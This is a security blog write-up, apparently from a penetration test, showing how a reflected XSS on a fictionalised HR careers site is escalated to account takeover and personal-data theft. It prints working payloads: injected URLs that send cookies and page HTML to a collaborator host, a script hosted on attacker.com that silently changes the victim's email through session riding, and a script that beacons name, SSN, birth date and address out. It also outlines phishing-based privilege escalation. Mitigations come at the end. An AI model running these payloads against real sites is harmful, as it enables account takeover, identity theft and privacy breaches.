<p>We realized that despite not being able to steal authentication cookies, we could still perform actions on behalf of the user through session riding (a form of CSRF - Cross-Site Request Forgery).</p>
<h3>Understanding Session Riding</h3>
<p>Session riding is particularly powerful in this context because:</p>
<ol>
<li>The victim's browser automatically includes their authenticated cookies with requests</li>
<li>JavaScript running in the context of the vulnerable domain can make requests to any endpoint on that domain</li>
<li>Modern CSRF protections often rely on tokens that our XSS can extract and reuse</li>
<li>Same-Origin Policy allows our injected JavaScript to read responses from the target domain</li>
</ol>
<p>The application had a user profile page at <code>/Account.aspx</code> where users could update their personal information, including email addresses. If we could change a user's email to one we controlled, we might be able to trigger a password reset and take over the account.</p>
<h3>Analyzing the Form Structure</h3>
<p>First, we needed to understand the request structure for updating a user's profile. We intercepted a legitimate profile update request with Burp Suite and found it was a multipart form POST request with numerous form fields:</p>
<pre class="language-http"><code class="language-http">POST /Account.aspx HTTP/1.1
Host: crosssitecorp.com
Cookie: [REDACTED]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="__EVENTTARGET"

ctl00$Main$btnSave$btnPrimary
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="__EVENTARGUMENT"

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwULLTE2MzM4NDg4MTgPZBYCZg9kFgICBA9kFgJmD2QWAgIBD2QWAmYPZBYCZg9kFg...
[TRUNCATED]
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="ctl00$Main$txtEmail$txtText"

victim@crosssitecorp.com
------WebKitFormBoundary7MA4YWxkTrZu0gW
[MANY MORE FORM FIELDS]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
</code></pre>
<h2>5. Crafting the Attack</h2>
<p>The key insight was that we could use our XSS to load an external JavaScript file that would:</p>
<ol>
<li>Fetch the Account page to get the current form state with valid tokens</li>
<li>Extract the form data</li>
<li>Modify the email address</li>
<li>Submit the form back to the server</li>
</ol>
<h3>HTTPS Requirement and Server Setup</h3>
<p>During our testing, we encountered an important browser security feature: mixed content blocking. Since CrossSiteCorp's website used HTTPS, attempting to load our JavaScript from a regular HTTP server resulted in the browser blocking the request. This is a security feature in modern browsers that prevents secure HTTPS pages from loading insecure HTTP resources, which could be tampered with in transit.</p>
<p>We needed a quick and reliable way to serve our exploit over HTTPS. Setting up a traditional HTTPS server would typically require:</p>
<ul>
<li>Obtaining an SSL certificate from a Certificate Authority</li>
<li>Configuring a web server like Apache or Nginx</li>
<li>Setting up proper SSL/TLS settings</li>
</ul>
<p>Instead, we opted for - <a href="https://caddyserver.com/">Caddy Server</a>, which provides automatic HTTPS with minimal configuration. Caddy automatically obtains and renews SSL certificates from Let's Encrypt, making it perfect for quickly setting up a secure endpoint for our exploit.</p>
<p>We created a JavaScript payload to host on our server (attacker.com/exploit.js):</p>
<pre class="language-javascript"><code class="language-javascript">;(async()=>{
  // Fetch the account page to get valid form values
  const html = await fetch("/Account/Account.aspx", {
    credentials: "include"  // Include cookies for authenticated request
  }).then(r=>r.text());

  // Parse the HTML response
  const doc = new DOMParser().parseFromString(html,"text/html");
  const form = doc.querySelector("form");

  // Get the form's action URL
  const base = `${window.location.origin}/Account/`;
  const action = new URL(form.getAttribute("action"), base).href;

  // Extract all form data (including CSRF tokens)
  const data = new FormData(form);

  // Set the target button that would normally be clicked
  data.set("__EVENTTARGET", "ctl00$Main$btnSave$btnPrimary");
  data.set("__EVENTARGUMENT", "");
  
  // Change the email to one we control
  data.set("ctl00$Main$txtEmail$txtText", "attacker@malicious.com");

  // Submit the modified form
  const res = await fetch(action, {
    method: "POST",
    credentials: "include",
    body: data
  });

  console.log(res.ok ? "Profile updated successfully!" : "Failed to update profile", res.status);
})();
</code></pre>
<p>Now we needed to deliver this payload through our XSS vulnerability. A direct script tag wouldn't work well because our injection point was in the document head. Instead, we used an event listener to execute our code after the page had loaded:</p>
<pre class="language-none"><code class="language-none">https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123&#x26;wd">&#x3C;script>addEventListener("load",Function("document.head.appendChild(Object.assign(document.createElement(\"script\"),{\"src\":\"https://attacker.com/exploit.js\"}))"));&#x3C;/script>jifk0=1
</code></pre>
<p>This payload:</p>
<ol>
<li>Injects a script tag into the page's head</li>
<li>Adds an event listener for the "load" event</li>
<li>When the page loads, creates a new script element pointing to our exploit.js file</li>
<li>Appends the script to the document head, causing it to load and execute</li>
</ol>
<h2>6. Account Takeover: The Final Step</h2>
<p>When a victim visited our specially crafted URL, their browser would execute our attack sequence:</p>
<h3>Stage 1: Initial Execution</h3>
<p>The victim loads the vulnerable Careers page with our malicious payload, and our injected script sets up a load event listener. When the page finishes loading, the listener executes, creating a new script element pointing to our hosted exploit.js, which is then loaded and executed in the context of crosssitecorp.com.</p>
<h3>Stage 2: Profile Manipulation</h3>
<p>The exploit script fetches the user's account page with their authenticated session and extracts the complete form structure including VIEWSTATE (ASP.NET's serialized page state), EVENTVALIDATION (validation hash for allowed form values), all form field values, and anti-CSRF tokens specific to the session. It then modifies only the email address field to one we control (attacker@malicious.com), constructs a multipart/form-data POST request with all original fields and tokens, and submits this request to the server, which validates all tokens and processes the change.</p>
<h3>Stage 3: Account Takeover</h3>
<p>With the email address changed in the system, we navigate to the login page, click "Forgot Password" and enter the victim's username. The system sends a password reset link to our attacker-controlled email. We receive the email, click the reset link, set a new password, and now have full access to the victim's account with valid credentials.</p>
<p>This attack is especially dangerous because it leaves minimal traces in logs (all requests come from the victim's IP and browser), bypasses multi-factor authentication tied to the login process, works even if the victim has an active session on another device, is difficult to detect since it uses legitimate application functionality, and the user won't be notified of suspicious access attempts, only of a completed email change.</p>
<p>From the victim's perspective, they simply clicked a link and continued browsing. Behind the scenes, our code executed silently, changed their email, and gave us control of their account. The victim might only realize something was wrong when they stopped receiving account-related emails or were unable to log in with their password.</p>
<h3>Alternative Attack: Direct Data Exfiltration</h3>
<p>While changing the email address for account takeover is one approach, we also explored direct exfiltration of sensitive user data. This approach is particularly effective when targeting multiple users simultaneously through a mass XSS campaign. Instead of manipulating the form, we can simply extract and exfiltrate the sensitive information already displayed on the user's account page.</p>
<p>We created an alternative payload focused on data exfiltration:</p>
<pre class="language-javascript"><code class="language-javascript">;(async()=>{
  // 1) Fetch the real "Account" form
  const url  = `${window.location.origin}/Account/Account.aspx`;
  const res  = await fetch(url, { credentials: 'include' });
  const html = await res.text();

  // 2) Parse it
  const doc  = new DOMParser().parseFromString(html, 'text/html');
  const form = doc.querySelector('form');

  // 3) List the exact form-field names you really care about
  const fields = [
    'ctl00$Main$txtFirst$txtText',      // First name
    'ctl00$Main$txtMiddle$txtText',     // Middle
    'ctl00$Main$txtLast$txtText',       // Last name
    'ctl00$Main$txtEmployeeNumber',     // Employee #
    'ctl00$Main$txtSsn',                // SSN
    'ctl00$Main$txtDOB$txtDate',        // DOB
    'ctl00$Main$txtaddress1$txtText',   // Address
    'ctl00$Main$txtCity$txtText',       // City
    'ctl00$Main$cmbState$cmbSelection', // State
    'ctl00$Main$txtZip$txtText',        // ZIP
    'ctl00$Main$txtPhone',              // Home phone
    'ctl00$Main$txtWorkPhone',          // Work phone
    'ctl00$Main$txtMobilePhone',        // Mobile phone
    'ctl00$Main$txtEmail$txtText',      // Work email
    'ctl00$Main$txtPersonalEmail$txtText' // Personal email
  ];

  // 4) Slurp them out of a FormData blob
  const fd   = new FormData(form);
  const data = {};
  for (const name of fields) {
    data[name.replace(/\W/g,'_')] = fd.get(name) || '';
  }

  // 5) b64-encode and beacon it off to your collaborator
  const payload = btoa(JSON.stringify(data));
  const img     = new Image();
  img.src       = `https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/collect?data=${encodeURIComponent(payload)}`;
  document.documentElement.appendChild(img);

  console.log('üì° exfiltrated:', data);
})();
</code></pre>
<p>This script:</p>
<ol>
<li>Fetches the user's account page with their authenticated session</li>
<li>Extracts specific sensitive form fields</li>
<li>Encodes the data as base64</li>
<li>Uses an image request to exfiltrate the data (which works even if fetch is blocked)</li>
<li>Logs the exfiltrated data to the console for debugging</li>
</ol>
<p>When deployed, this payload successfully exfiltrated sensitive user information. In our Burp Collaborator, we received:</p>
<pre class="language-http"><code class="language-http">GET /collect?data=ICAiY3RsMDBfTWFpbl90eHRGaXJzdF90eHRUZXh0IjogIk1pY2hhZWwiLAogICJjdGwwMF9NYWluX3R4dE1pZGRsZV90eHRUZXh0IjogIlJvYmVydCIsCiAgImN0bDAwX01haW5fdHh0TGFzdF90eHRUZXh0IjogIkpvaG5zb24iLAogICJjdGwwMF9NYWluX3R4dEVtcGxveWVlTnVtYmVyIjogIkVNUC00NTg5MiIsCiAgImN0bDAwX01haW5fdHh0U3NuIjogIjQyMS02OS04NzMyIiwKICAiY3RsMDBfTWFpbl90eHRET0JfdHh0RGF0ZSI6ICIwNC8xNy8xOTg1IiwKICAiY3RsMDBfTWFpbl90eHRhZGRyZXNzMV90eHRUZXh0IjogIjg3MjEgT2Frd29vZCBEcml2ZSwgQXBhcnRtZW50IDE1Q... HTTP/1.1
Host: k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: https://crosssitecorp.com/
</code></pre>
<p>When we decoded the base64 data, we found a wealth of sensitive information about the user:</p>
<pre class="language-json"><code class="language-json">{
  "ctl00_Main_txtFirst_txtText": "Michael",
  "ctl00_Main_txtMiddle_txtText": "Robert",
  "ctl00_Main_txtLast_txtText": "Johnson",
  "ctl00_Main_txtEmployeeNumber": "EMP-45892",
  "ctl00_Main_txtSsn": "421-69-8732",
  "ctl00_Main_txtDOB_txtDate": "04/17/1985",
  "ctl00_Main_txtaddress1_txtText": "8721 Oakwood Drive, Apartment 15B",
  "ctl00_Main_txtCity_txtText": "Arlington",
  "ctl00_Main_cmbState_cmbSelection": "VA - Virginia",
  "ctl00_Main_txtZip_txtText": "22201",
  "ctl00_Main_txtPhone": "(703) 555-1842",
  "ctl00_Main_txtWorkPhone": "(202) 555-9371",
  "ctl00_Main_txtMobilePhone": "(703) 555-3914",
  "ctl00_Main_txtEmail_txtText": "michael.johnson@crosssitecorp.com",
  "ctl00_Main_txtPersonalEmail_txtText": "mike.johnson85@gmail.com"
}
</code></pre>
<p>This data represents a significant privacy breach, containing:</p>
<ul>
<li>Full name and date of birth</li>
<li>Social Security Number</li>
<li>Complete home address</li>
<li>Multiple contact phone numbers</li>
<li>Both work and personal email addresses</li>
<li>Employee identification number</li>
</ul>
<p>With this information, an attacker could:</p>
<ol>
<li>Conduct identity theft</li>
<li>Target the user with highly convincing spear-phishing attacks</li>
<li>Attempt to access other accounts using the personal information for password recovery</li>
<li>Sell the data on underground markets</li>
<li>Use the information for physical stalking or harassment</li>
<li>Impersonate the employee within the organization</li>
</ol>
<p>The most concerning aspect is that this attack can be deployed at scale. By finding a way to distribute the malicious URL (through targeted phishing, water-holing, or social engineering), an attacker could potentially exfiltrate data from hundreds or thousands of employees with minimal effort.</p>
<h3>Variations of the Attack</h3>
<p>The attack techniques described can be extended in several ways for even greater impact. Attackers might establish long-term control by adding secondary recovery emails or phone numbers rather than changing the primary email, creating a less detectable backdoor to accounts that victims might never notice. Data exfiltration can be expanded beyond basic profile information to corporate data, financial records, and even internal documents depending on the user's access level.</p>
<p>Once initial access is gained, attackers can use one account to send convincing internal communications to other employees, expanding the attack surface organically. Sophisticated attackers can maintain access while minimizing detection risk by making subtle changes to notification preferences or adding monitoring scripts, allowing them to observe user activities over extended periods without triggering security alerts.</p>
<h2>7. Impact and Lessons Learned</h2>
<p>This attack chain demonstrates how a seemingly low-impact XSS vulnerability can be escalated to complete account takeover when combined with:</p>
<ol>
<li>The ability to execute JavaScript in the victim's browser</li>
<li>Knowledge of the application's form structure</li>
<li>A clever approach to bypass anti-CSRF protections</li>
<li>An understanding of how to manipulate the DOM</li>
</ol>
<h2>8. Mitigation Steps</h2>
<p>Protecting against this type of attack chain requires implementing several complementary security measures. Properly encoding all user input when reflecting it in HTML responses forms the first line of defense against XSS vulnerabilities, preventing attackers from injecting malicious scripts.</p>
<p>A robust Content Security Policy header provides an additional layer of protection by restricting which domains can serve executable scripts to your application. A policy like default-src 'self'; script-src 'self' would effectively prevent loading external malicious scripts, blocking the attack chain we demonstrated.</p>
<p>Email change verification serves as a critical security checkpoint. By requiring verification from both the old and new email addresses before completing a change, applications can prevent unauthorized email modifications even if an attacker manages to bypass other protections.</p>
<h2>9. XSS in Modern Social Engineering and Red Team Operations</h2>
<p>The attack techniques described in this article have significant implications beyond individual account takeovers. In modern red team operations and advanced social engineering campaigns, XSS vulnerabilities serve as powerful initial access vectors that can be leveraged for sophisticated privilege escalation and lateral movement within an organization.</p>
<h3>Privilege Escalation via XSS</h3>
<p>One of the most valuable aspects of XSS in real-world red team operations is its ability to enable privilege escalation. Once we've compromised a low-privilege account using the techniques described above, we can leverage that account to target higher-privilege users within the organization. Using information gathered from the compromised low-level account (such as organizational charts, internal communications, or reporting structures), we can identify users with elevated privileges like department heads, IT administrators, or C-level executives. With knowledge of the internal system, we can craft more sophisticated payloads that specifically target administrative interfaces or internal tools that aren't accessible to regular users.</p>
<h3>Social Engineering Enhancement</h3>
<p>XSS significantly enhances social engineering efforts by exploiting trust relationships. Messages or links sent from a legitimate compromised account carry inherent trust - if a finance team member receives a link from a colleague they've worked with for years, they're much more likely to click it than a random external email. After compromising a low-level account, we gain visibility into ongoing projects, communication styles, and organizational norms, allowing us to craft highly convincing social engineering messages that reference real events, use appropriate terminology, and arrive at expected times.</p>
<p>In one real-world (anonymized) example, we compromised a junior HR staff account via the XSS vulnerability, used that access to study internal communications and identify the IT support workflow, crafted a convincing "password reset required" message to the IT administrator, and gained administrative credentials that provided access to sensitive company data.</p>
<h3>Real-World Example: Sensitive Data Access Progression</h3>
<p>In a sanitized example from a real engagement, we were able to demonstrate a concerning attack path: Initial compromise of a standard employee account through the XSS vulnerability, discovery of the company's internal ticketing system through the compromised account, identification of IT administrators who had recently helped other users, sending a targeted XSS link to an IT administrator through the internal messaging system, and compromise of the administrator account, providing access to user management systems, internal security configuration tools, customer data repositories, and financial information.</p>
<p>What made this attack particularly effective was that each step appeared legitimate to the victims. The XSS payload was delivered via trusted channels from known colleagues, making traditional security awareness training less effective as a defense.</p>
<h2>Conclusion</h2>
<p>The journey from a simple reflected XSS vulnerability to full account takeover and sensitive data extraction demonstrates the profound security risks that seemingly minor vulnerabilities can pose when skillfully exploited. Through this complete attack chain, we've seen how modern web applications remain vulnerable despite decades of security awareness around cross-site scripting.</p>
<p>What makes this exploitation path particularly concerning is not its technical sophistication‚Äîwe used relatively simple JavaScript techniques‚Äîbut rather its effectiveness at bypassing multiple layers of security controls that organizations typically rely on. The attack circumvented HttpOnly cookie protections, anti-CSRF measures, and even the natural suspicion users might have toward external communications.</p>
<p>The data exfiltration component reveals a critical privacy dimension often overlooked in XSS assessments. Beyond simply taking over accounts, attackers can silently harvest sensitive personal and corporate information that may have serious consequences for both individuals and organizations. The Social Security Numbers, home addresses, and contact details exposed in our testing represent just one category of sensitive data that might be compromised.</p>
<p>As web applications continue to evolve and grow more complex, we can expect attackers to discover new ways of chaining vulnerabilities together. By understanding these sophisticated attack paths and implementing appropriate defenses, organizations can better protect their users' sensitive data and maintain the trust that's essential to their digital operations.</p>
<p>Happy Hacking! (Ethically, of course)</p>
<hr>
<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">¬© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"slug":"XSS-to-Account-Takeover-and-Data-Exfiltration","contentHtml":"\n\u003cp\u003e\u003cimg src=\"/images/xss-account-takeover.jpeg\" alt=\"Cross-site scripting\"\u003e\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eCross-Site Scripting (XSS) vulnerabilities continue to plague web applications despite being well-understood for decades. While they might seem simple on the surface, the impact of XSS can be devastating when chained with other attack techniques.\u003c/p\u003e\n\u003cp\u003eIn this article, I'll walk through a real-world example of how a seemingly innocent XSS vulnerability was leveraged to achieve full account takeover and sensitive data exfiltration. We'll explore the complete attack chain - from initial discovery to exploitation - demonstrating how attackers can pivot from a basic reflected XSS to stealing Social Security Numbers, personal information, and ultimately taking control of user accounts.\u003c/p\u003e\n\u003cp\u003eThe beauty of this attack chain lies in its simplicity and effectiveness. By finding an unprotected endpoint with XSS, then combining it with session riding techniques, we were able to bypass modern browser protections and achieve multiple high-impact objectives with minimal effort.\u003c/p\u003e\n\u003ch2\u003eImportant Disclaimer !\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eAll company names, domains, URLs, and personal data presented in this article are entirely fictional.\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eWhile the attack methodology and techniques described are based on a real-world security assessment, all identifying details have been completely changed to protect confidentiality. The vulnerabilities described have since been remediated by the affected organization. This article is published for educational purposes only.\u003c/p\u003e\n\u003ch2\u003ePrerequisites\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eA web proxy for intercepting/modifying requests (like Burp Suite)\u003c/li\u003e\n\u003cli\u003eBasic knowledge of Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF)\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003e1. Discovering the Vulnerability\u003c/h2\u003e\n\u003cp\u003eThe first step in any security assessment is thorough reconnaissance. Using directory brute forcing tools like dirb or gobuster can often reveal hidden endpoints that aren't linked from the main application interface.\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e$ dirb https://crosssitecorp.com /usr/share/wordlists/dirb/common.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eDuring our assessment, we discovered an interesting endpoint at \u003ccode\u003e/HR/Career.aspx\u003c/code\u003e that accepted a \u003ccode\u003eClient\u003c/code\u003e parameter and several other query parameters. This caught our attention because:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eIt wasn't linked from the main application\u003c/li\u003e\n\u003cli\u003eIt accepted multiple user-controlled parameters\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eWe decided to test for XSS by injecting a simple payload into one of the parameters. During our testing, we discovered some filtering mechanisms were in place:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsing the equals sign (\u003ccode\u003e=\u003c/code\u003e) in our payload resulted in HTTP 500 errors\u003c/li\u003e\n\u003cli\u003eSingle quotes (\u003ccode\u003e'\u003c/code\u003e) were being filtered out of our input\u003c/li\u003e\n\u003cli\u003eSome standard XSS payloads were blocked by the application\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThrough trial and error, we found a payload pattern that bypassed these filters:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ehttps://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123\u0026#x26;xxFxx\"\u003e\u0026#x3C;script\u003ealert(1)\u0026#x3C;/script\u003ejifk0=1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTo our surprise, the application reflected our payload directly into the page's HTML without proper sanitization:\u003c/p\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;meta http-equiv=\"X-UA-Compatible\" content=\"IE=9\" /\u003e\n\u0026#x3C;link rel='Icon' href='/images/logo.png' /\u003e\n\u0026#x3C;meta property=\"og:url\" content=\"https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123\u0026#x26;xxFxx\"\u003e\u0026#x3C;script\u003ealert(1)\u0026#x3C;/script\u003ejifk0=1\" /\u003e\u0026#x3C;meta property=\"og:title\" content=\"Cross Site Corp Careers\" /\u003e\u0026#x3C;meta property=\"og:description\" content=\"Cross Site Corp Careers\" /\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe alert box popped, confirming we had found a viable XSS vulnerability despite the partial filtering. But how severe was it? Could we leverage it to do something more impactful than just displaying an alert box?\u003c/p\u003e\n\u003ch2\u003e2. Assessing the Impact\u003c/h2\u003e\n\u003cp\u003eWith XSS confirmed, we needed to evaluate what we could access within the context of the vulnerable page. Our first thought was to try to extract cookies that might contain session information.\u003c/p\u003e\n\u003cp\u003eTo capture the exfiltrated data, we set up a Burp Collaborator client, which provides a unique subdomain (in our case, \"k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com\") that can capture HTTP/DNS interactions. This allowed us to collect data without setting up a separate server infrastructure.\u003c/p\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e// Attempt to extract cookies\nfetch(\"https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/\" + document.cookie)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe crafted the following payload to send cookies to our collection server:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ehttps://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123\u0026#x26;wd\"\u003e\u0026#x3C;script\u003efetch(\"https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/\" + document.cookie)\u0026#x3C;/script\u003ejifk0=1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen the victim's browser executed our payload, Burp Collaborator captured the HTTP request containing the cookies:\u003c/p\u003e\n\u003cpre class=\"language-http\"\u003e\u003ccode class=\"language-http\"\u003eGET /IsSessionActive=true;_ga=GA1.2.1809283711.1683748940;_gid=GA1.2.1672134812.1683748940;_fbp=fb.1.1683748940623.957356889 HTTP/1.1\nHost: k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\nAccept: */*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUpon examining the requests more closely in Burp Suite, we discovered that the authentication cookies were protected with the \u003ccode\u003eHttpOnly\u003c/code\u003e flag, preventing JavaScript from accessing them:\u003c/p\u003e\n\u003cpre class=\"language-http\"\u003e\u003ccode class=\"language-http\"\u003eSet-Cookie: .AUTH=F2AD67B9FC03A2B9A802F24C8C32A5FB8; path=/; HttpOnly; Secure; SameSite=Lax\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis meant we couldn't simply steal the authentication cookies via JavaScript. We needed a different approach.\u003c/p\u003e\n\u003ch2\u003e3. Expanding Our Testing\u003c/h2\u003e\n\u003cp\u003eSince direct cookie theft wasn't possible, we tried to extract the page's HTML content to see if there was any sensitive information or potential attack vectors. Again, we used our Burp Collaborator endpoint to capture the exfiltrated data:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ehttps://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123\u0026#x26;wd\"\u003e\u0026#x3C;script\u003efetch(\"https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/dom?html=\" + btoa(document.documentElement.innerHTML))\u0026#x3C;/script\u003ejifk0=1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBurp Collaborator captured the base64-encoded HTML of the page:\u003c/p\u003e\n\u003cpre class=\"language-http\"\u003e\u003ccode class=\"language-http\"\u003eGET /dom?htmlPGhlYWQ+PGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iL0RYUi5heGQ/cj0xXzEyLDFfNSwxXzMtQTNvQnUiPjx0aXRsZT4KCUNyb3NzIFNpdGUgQ29ycCBDYXJlZXJzIEpvYiBPcGVuaW5ncwkKPC90aXRsZT48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEiPgogICAgICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9OSI+CiAgICAgICAgPGxpbmsgcmVsPSJDb21wYW55IEljb24iIGhyZWY9Ii9pbWFnZXMvbG9nby5wbmciPgogICAgICAgIDxtZXRhIHByb3BlcnR5PSJvZzp1cmwiIGNvbnRlbnQ9Imh0dHBzOi8vY3Jvc3NzaXRlY29ycC5jb20vam9icy9jYXJlZXIuYXNweA... HTTP/1.1\nHost: k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com\nAccept: */*\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe advantage of using Burp Collaborator is that it provides a complete log of all interactions, including headers and request parameters, which helped us analyze the exfiltrated data more effectively. It also doesn't require setting up a separate server infrastructure, making it an ideal tool for security assessments.\u003c/p\u003e\n\u003cp\u003eWhen decoded, the base64 data revealed the following HTML structure:\u003c/p\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;head\u003e\u0026#x3C;link rel=\"stylesheet\" type=\"text/css\" href=\"/DXR.axd?r=1_12,1_5,1_3-A3oBu\"\u003e\u0026#x3C;title\u003e\n\tCross Site Corp Careers\t\n\u0026#x3C;/title\u003e\u0026#x3C;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n        \u0026#x3C;meta http-equiv=\"X-UA-Compatible\" content=\"IE=9\"\u003e\n        \u0026#x3C;link rel=\"Company Icon\" href=\"/images/logo.png\"\u003e\n        \u0026#x3C;meta property=\"og:url\" content=\"https://crosssitecorp.com/HR/Career.aspx?Client=COMPANY123\u0026#x26;wd\"\u003e\u0026#x3C;script\u003efetch(\"https://k8tzf2dpSOMEBURPCOLLABURL5ku.oastify.com/dom?html=\"+btoa(document.documentElement.innerHTML))\u0026#x3C;/script\u003ejifk0=1\"\u003e\n        \u0026#x3C;meta property=\"og:title\" content=\"Cross Site Corp Careers\"\u003e\n        \u0026#x3C;meta property=\"og:description\" content=\"Cross Site Corp Careers\"\u003e\n\u0026#x3C;/head\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis confirmed our injection point was in the meta tags within the document head, limiting our visibility of the full DOM structure.\u003c/p\u003e\n\u003ch2\u003e4. Session Riding: The Key to Escalation\u003c/h2\u003e\n\u003cp\u003eWe realized that despite not being able to steal authentication cookies, we could still perform actions on behalf of the user through session riding (a form of CSRF - Cross-Site Request Forgery).\u003c/p\u003e\n\u003ch3\u003eUnderstanding Session Riding\u003c/h3\u003e\n\u003cp\u003eSession riding is particularly powerful in this context because:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe victim's browser automatically includes their authenticated cookies with requests\u003c/li\u003e\n\u003cli\u003eJavaScript running in the context of the vulnerable domain can make requests to any endpoint on that domain\u003c/li\u003e\n\u003cli\u003eModern CSRF protections often rely on tokens that our XSS can extract and reuse\u003c/li\u003e\n\u003cli\u003eSame-Origin Policy allows our injected JavaScript to read responses from the target domain\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe application had a user profile page at \u003ccode\u003e/Account.aspx\u003c/code\u003e where users could update their personal information, including email addresses. If we could change a user's email to one we controlled, we might be able to trigger a password reset and take over the account.\u003c/p\u003e\n\u003ch3\u003eAnalyzing the Form Structure\u003c/h3\u003e\n\u003cp\u003eFirst, we needed to understand the request structure for updating a user's profile. We intercepted a legitimate profile update request with Burp Suite and found it was a multipart form POST request with numerous form fields:\u003c/p\u003e\n\u003cpre class=\"language-http\"\u003e\u003ccode class=\"language-http\"\u003ePOST /Account.aspx HTTP/1.1\nHost: crosssitecorp.com\nCookie: [REDACTED]\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\n\nctl00$Main$btnSave$btnPrimary\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n\n/wEPDwULLTE2MzM4NDg4MTgPZBYCZg9kFgICBA9kFgJmD2QWAgIBD2QWAmYPZBYCZg9kFg...\n[TRUNCATED]\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"ctl00$Main$txtEmail$txtText\"\n\nvictim@crosssitecorp.com\n------WebKitFormBoundary7MA4YWxkTrZu0gW\n[MANY MORE FORM FIELDS]\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e5. Crafting the Attack\u003c/h2\u003e\n\u003cp\u003eThe key insight was that we could use our XSS to load an external JavaScript file that would:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFetch the Account page to get the current form state with valid tokens\u003c/li\u003e\n\u003cli\u003eExtract the form data\u003c/li\u003e\n\u003cli\u003eModify the email address\u003c/li\u003e\n\u003cli\u003eSubmit the form back to the server\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eHTTPS Requirement and Server 